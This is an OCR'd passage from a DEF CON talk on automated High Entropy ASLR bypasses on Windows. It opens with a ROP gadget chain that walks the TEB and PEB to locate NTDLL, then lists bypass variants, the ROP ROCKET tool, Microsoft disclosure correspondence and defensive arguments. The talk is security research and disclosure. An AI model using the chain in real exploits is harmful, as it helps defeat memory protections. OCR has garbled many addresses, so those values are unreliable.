@x0000000180006c35, #mov r8, rax # ret # Transfer to4 rs #
@x900000018000719b, #xor rdx, rdx # ret # ThreadBasicInformation #
@x0000000180006ed0, #pop r9 # ret # load r9, sizeof(THREAD_BASIC_INFORMATION) #
@x0000000180006b14, #pop rax # ret # load rax, NtQueryInformationThread SSN (all Win. 10-11) #
@x0000000180006ed3, #pop r1@ # ret # load r1@, first parm from rcx #
@xee00000180006ce7, #syscall # ret # #
0x8000000180006cC06, #mov rax, rsp # ret # Save esp to rax #
@x0000000180006ed7, #pop rbx # ret # load rbx, loading for Getting pointer to retrieving TEB #
0x000000018000838F, #add rax, rbx # ret # Getting pointer to retrieving TEB #
@x900000018000777b, #mov rbx, rax # ret # Transfer to4 rbx #
@x000000018000732b, #mov rax, qword ptr [rbx] # ret # Dereferencing to obtain retrieving TEB #
@x9000000180006b14, #pop rax # ret # load rax, Reaching the PEB #
@x900000018000777b, #mov rbx, rax # ret # Transfer to ebx #
@x0000000180006c6a, #add eax, ebx # ret # Adding offset @x6@ to get PEB address #
@x0000000180006C35, #mov r8, rax # ret # Transfer reg #
@x0000000180006b14, #pop rax # ret # load rax, Loading @x18, offset to reach PEB_LDR #
@x0000000180006cC65, #add r8, rax # ret # Add to get PEB LDR #
@x0000000180006e8e, #mov rax, qword ptr [r8] # ret # Dereferencing the PEB_LDR #
@x0000000180006ed7, #pop rbx # ret # load rbx, Loading @x3@ - value to reach LDR.InInitalizationModul
@x0000000180006c6a, #add eax, ebx # ret # Adding value to reach InInitalizationModuleList #
@x000000018000726b, #mov rax, qword ptr [rax] # ret # 1Dereference LDR.InInitalizationModuleList 1-- \
@x0000000180006ed7, #pop rbx # ret # load rbx, Loading 6x10, offset to reach base of NTDLL #
```

## Slide 62

#### **ROP ROCKET: ASLR Mini Tool**

▪ The ASLR Mini-Tool supports four unique ways to retrieve the PEB, directly or indirectly.

▪ Thus, 36 variations of techniques to bypass ASLR are possible (9 x 4).

**Can’t Stop the ROP: Automating Universal ASLR Bypasses for Windows**

## Slide 63

#### **ROP ROCKET: ASLR Mini Tool**

▪ In all, we can with **100%, absolute assurance** bypass ASLR using one of the **four methods of disclosing the PEB** along, with **each of the three module lists** .

**Can’t Stop the ROP: Automating Universal ASLR Bypasses for Windows**

## Slide 64

##### - Nine Bypass Techniques for ASLR Mini Tool

▪ Kernel32 via InInitalizationModuleList ▪ Kernelbase via InInitalizationModuleList ▪ NTDLL via InInitalizationModuleList ▪ Kernel32 via InMemoryOrderModuleList ▪ Kernelbase via via InMemoryOrderModuleList ▪ Kernel32 via via InMemoryOrderModuleList ▪ Kernel32 via InLoadOrderModuleList ▪ Kernelbase via via InLoadOrderModuleList ▪ Kernel32 via via InLoadOrderModuleList

**Can’t Stop the ROP: Automating Universal ASLR Bypasses for Windows**

## Slide 65

#### **ROP ROCKET: ASLR Mini Tool**

- Kernel32 via InInitalizationModuleList with GS Register

- ▪ Kernelbase via InInitalizationModuleList with GS Register

- NTDLL via InInitalizationModuleList with GS Register

- Kernel32 via InMemoryOrderModuleList with GS Register

- Kernelbase via InMemoryOrderModuleList with GS Register

- Kernel32 via InMemoryOrderModuleList with GS Register

- Kernel32 via InLoadOrderModuleList with GS Register

- Kernelbase via InLoadOrderModuleList with GS Register

- Kernel32 via InLoadOrderModuleList with GS Register

**Can’t Stop the ROP: Automating Universal ASLR Bypasses for Windows**

## Slide 66

#### **ROP ROCKET: ASLR Mini Tool**

- Kernel32 via InInitalizationModuleList with Rdgsbase

- Kernelbase via InInitalizationModuleList with Rdgsbase

- NTDLL via InInitalizationModuleList with Rdgsbase

- Kernel32 via InMemoryOrderModuleList with Rdgsbase

- Kernelbase via InMemoryOrderModuleList with Rdgsbase

- Kernel32 via InMemoryOrderModuleList with Rdgsbase

- ▪ Kernel32 via InLoadOrderModuleList with Rdgsbase

- Kernelbase via InLoadOrderModuleList with Rdgsbase

- Kernel32 via InLoadOrderModuleList with Rdgsbase

**Can’t Stop the ROP: Automating Universal ASLR Bypasses for Windows**

## Slide 67

#### **ROP ROCKET: ASLR Mini Tool**

- Kernel32 via InInitalizationModuleList NtQueryInformationProcess

- ▪ Kernelbase via InInitalizationModuleList NtQueryInformationProcess

- NTDLL via InInitalizationModuleList NtQueryInformationProcess

- Kernel32 via InMemoryOrderModuleList NtQueryInformationProcess

- Kernelbase via InMemoryOrderModuleList NtQueryInformationProcess

- Kernel32 via InMemoryOrderModuleList NtQueryInformationProcess

- ▪ Kernel32 via InLoadOrderModuleList NtQueryInformationProcess

- Kernelbase via InLoadOrderModuleList NtQueryInformationProcess

- Kernel32 via InLoadOrderModuleList NtQueryInformationProcess

**Can’t Stop the ROP: Automating Universal ASLR Bypasses for Windows**

## Slide 68

#### **ROP ROCKET: ASLR Mini Tool**

- Kernel32 via InInitalizationModuleList NtQueryInformationThread

- ▪ Kernelbase via InInitalizationModuleList NtQueryInformationThread

- NTDLL via InInitalizationModuleList NtQueryInformationThread

- ▪ Kernel32 via InMemoryOrderModuleList NtQueryInformationThread

- ▪ Kernelbase via InMemoryOrderModuleList NtQueryInformationThread

- Kernel32 via InMemoryOrderModuleList NtQueryInformationThread

- Kernel32 via InLoadOrderModuleList NtQueryInformationThread

- Kernelbase via InLoadOrderModuleList NtQueryInformationThread

- Kernel32 via InLoadOrderModuleList NtQueryInformationThread

**Can’t Stop the ROP: Automating Universal ASLR Bypasses for Windows**

## Slide 69

#### GitHub

▪ ROP ROCKET: ASLR Mini-Tool <u>https://github.com/Bw3ll/ROP_ROCKET</u> ▪ **ASLR Mini-Tool** is part of **ROP ROCKET** , as a new **mini-tool** (feature set), released at **DEF CON** !

**Can’t Stop the ROP: Automating Universal ASLR Bypasses for Windows**

## Slide 70

**Tool Demo**

Video of tool in action!

## Slide 71

#### **Disclosure Timeline**

**Date Event** April 15, 2024 0-day <u>privately reported to MSRC</u> May, 2024 Microsoft acks validity, decides to do nothing 7/11/2025 MS asks to meet during BH in Vegas. 8/7/2025 Met with MSVR during BH. Today DEF CON release + mini-tool open-sourced!

▪ No patch ETA; **Microsoft likely won’t fix** .

**Can’t Stop the ROP: Automating Universal ASLR Bypasses for Windows**

## Slide 72

– Valid but no bounty

▪ Microsoft confirms validity of report, but decides it is better not to pay, because … **reasons** .


> Recovered by OCR — confidence 92/100 on the text kept, 92/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Valid — but no bounty @.
DEFC@N . Microsoft confirms validity of report, but decides
it is better not to pay, because ...
In response to your case submission CRM:0450000982
Microsoft Security Response Center <secure@microsoft.com
to me, Microsoft ~
Hello
Thank you again for submitting this issue to Microsoft. Although your report is va ent prio
I critical” s Fi nmediate servicing. After careful investigation, this case does not meet MSRC’s
assessec Important” or “Critical” s
current bar for immediate servicing because ASLR bypasses that already require code execution at the same privilege level do not cross
an MSRC security boundary.
```

## Slide 73

##### **Microsoft’s Patch History (and Sad Silence)**

▪ **2013** : **MS 13-063** removed fixed pointers ( **`LdrHotPatchRoutine`** ) from _SharedUserData_ at `0x7FFE0000` after researchers **showed an ASLR bypass** .

▪ That fix shows Microsoft **will change low-level data** for security.

▪ **2024** : Nine High Entropy ASLR bypasses **submitted** . ▪ Microsoft verifies the vulnerability but **declines to fix it** . ▪ **No Bounty given** .

▪ **Changing PEB** or **`LDR_DATA_TABLE_ENTRY`** offsets is harder, but _not_ impossible.

▪ This is a step that Microsoft would need to undertake.

## Slide 74

Contacts from Microsoft

## Slide 75

#### Invite to Meet?

- Invited to meet on July 11.

- • Ignored them for almost two weeks, agreeing to meet July 22.


> Recovered by OCR — confidence 92/100 on the text kept, 91/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Connect with MSRC in Las Vegas @ @
MSRC Listens <msrclistens@microsoft.com> Invite to Meet? Fri, Jul11,1:58PM x Say
¢ Invited to meet on July 11.
¢ Ignored them for almost two weeks, agreeing to
meet July 22.
Hello
We saw that you'll be speaking at DEF CON — congratulations! While you're in Las Vegas, we would love to invite you to join the Microsoft
Security Response Center (MSRC) team for some food, drink, and conversation about your experience working with us.
We'll be at Libertine Social in Mandalay Bay on August 6-7, and we'd be thrilled to connect with you there. Grab a time that works for you
with this
link
```

## Slide 76

**Another email…**


> Recovered by OCR — confidence 94/100 on the text kept, 94/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Re your DEF CON talk and related MSRC cases Inbox x x @ @
Nic Fillingham <#8@microsoft.com> Wed, Jul 30, 5:15PM (11daysago) xe © &
— Another email...
Nic here from the Microsoft Security Response Center (MSRC) team.
Hello Dr Bramwell,
We see that you'll be presenting a DEF CON session on ASLR Bypasses for Windows.
Re this part of your talk abstract: “This talk will debut nine novel bypasses of the strongest form of ASLR on Windows, which makes attacks such as brute-
forcing totally infeasible. This talk showcases how mostly simple, easy-to-find ROP gadgets can be used to construct highly reliable, universal ASLR
bypasses to key Windows system DLLs, allowing ROP gadgets from those DLLs to be used freely in exploits!”
Could you please confirm whether your talk and tool/demo will include any new/undisclosed vulnerabilities, exploits, techniques etc. that MSRC should
assess for potential remediation? If so, could you please share the relevant details or submit these directly to MSRC at https://msrc.microsoft.com/report/ ?
And could you also please confirm whether your talk will discuss any existing MSRC cases (submitted by you or others) so that we can review to see if there
are any outstanding issues that need to be addressed or public-facing documentation that may need to be updated or created?
Please let me know if you have any questions.
Thank you
-Nic
```

## Slide 77

#### Wanting to Meet?

- Met August 7 and spoke around 50 minutes in detail regarding my case.

- Email mentioned food – none was offered.

- No money, but t-shirt in the wrong size. ▪ I guess it is the thought that counts?

- Wondered how they could change the scope so that it was clear they would not pay out. ▪ Maybe honor the existing scope?

## Slide 78

#### **Microsoft’s Bounty**

_“Although we were already aware of the underpinnings of this bypass before it was publicly described, it is a great example of a technique that_ **_could have qualified for our recently announced Mitigation Bypass Bounty Program_** _._ This bounty program offers exceptional rewards (up to **$100,000** ) for novel exploitation techniques that affect the latest versions of our products. In this case, the bypass was generic, could be made reliable, had reasonable requirements, applied to high impact user mode application domains, and had elements that made it novel. Discovering and mitigating exploitation techniques of this nature can help us make our platform safer and more secure by breaking the techniques that attackers rely on to develop reliable exploits.* — **Matt Miller & William Peteroy** , Microsoft Security Response Center <u>https://msrc.microsoft.com/blog/2013/08/mitigating-theldrhotpatchroutine-depaslr-bypass-with-ms13-063/</u>

▪ Microsoft **acknowledged** our bypasses as valid yet awarded **$0** .

▪ Our work **meets all the criteria they praised above.**

## Slide 79

#### **Current Situation**

- Microsoft refuses to pay because it “does not cross a security boundary.”

   - Yes, and? ASLR bypasses that do not cross a security boundary were not defined as out of scope according to what was posted.

- Paying these bounties is **pocket change** to a company like Microsoft, which makes billions in profits and continuously lays off thousands, to further increase profits.

- A google search shows **$88.136 B** in profit for Microsoft in 2024.

## Slide 80

##### **Why this matters for Windows malware**

- Randomizing **PEB internals** or other mitigations would totally, **completely break this ubiquitous dynamic resolution technique** .

- ▪ Function addresses could no longer be easily resolved at runtime via PEB-walking.

- This would have huge impact - not only in mitigating this ASLR bypass - but in **crippling much of current native (C/C++) malware and shellcode** .

   - Shellcode would **ONLY** be able to use **Windows syscalls** !

   - This would break all current malware / shellcode and **force rewrites** .

   - They would be forced to use more obvious higher-level ways of invoking Windows functionality.

- This would be **highly impactful** - significantly disrupting the malware landscape

- Mitigation **erases a totally ubiquitous stealth technique** that is very widely used.

**Can’t Stop the ROP: Automating Universal ASLR Bypasses for Windows**

## Slide 81

##### **After Securing PEB and ModuleLists**

- **Forced use of normal imports** .

   - Malware might be **forced to statically link needed APIs** and call the, **normally** .

   - Makes malware’s capabilities **far more transparent** .

   - Malware could **no longer hide its imports** .

- A second option - reliance on easy to spot APIs to load WinAPIs ( **GetProcAddress** / **LoadLibrary** )

   - Effective but these API calls can be very easily monitored or hooked.

   - ▪ Both of the above could be **intercepted and detected** !

- They would be forced **expose their malicious functionality** with direct WinAPI usage (simple to detect).

- A massive gain in **visibility for defenders** .

## Slide 82

###### **A More Sophisticated Alternative: Enter the Syscall**

- **Significantly raises difficulty** for malware authors to maintain stealth.

- **Highly evasive malware** can bypass WinAPIs by using **direct syscalls** .

   - This is done, but usually in **a more limited capacity** .

   - Invoking all malicious functionality via syscalls is a **significant engineering effort** .

- Complex Windows syscall usage can be **very non-trivial** , often undocumented.

- ▪ **Syscalls are not magic** - some EDR can still detect abnormal syscall usage. ▪ Syscalls are usually used only in combination with other stealth techniques - **not as primary or only stealth technique** .

- Only a **small elite subset** could invest in implementing all malicious functionality via Windows syscalls.

- Commodity malware will **become noisy** - with malicious functionality obvious.

**Can’t Stop the ROP: Automating Universal ASLR Bypasses for Windows**

## Slide 83

**Some Takeaways** ▪ PEB, module lists, and supporting structs remain a **single point of failure** . ▪ We demonstrated universal, automated bypass with common gadgets. ▪ If Microsoft patches, broad class of malware breaks. **Massive win** ! ▪ **Sadly, Microsoft. Does. Not. Care. :-( Can’t Stop the ROP: Automating Universal ASLR Bypasses for Windows**

## Slide 84

# **Thank you!**

DEF CON is a very special place. Thank you for coming to DEF CON!

## Slide 85

#### Contact

**Dr. Bramwell Brizendine** ▪ Email: <u>bramwell.brizendine@uah.edu</u> | <u>bramwell.brizendine@gmail.com</u> ▪ GitHub: <u>https://github.com/Bw3ll</u> ▪ ROP ROCKET: ASLR Mini-Tool <u>https://github.com/Bw3ll/ROP_ROCKET</u> ▪ LinkedIn: <u>https://www.linkedin.com/in/bramwell-b22109b303/</u>
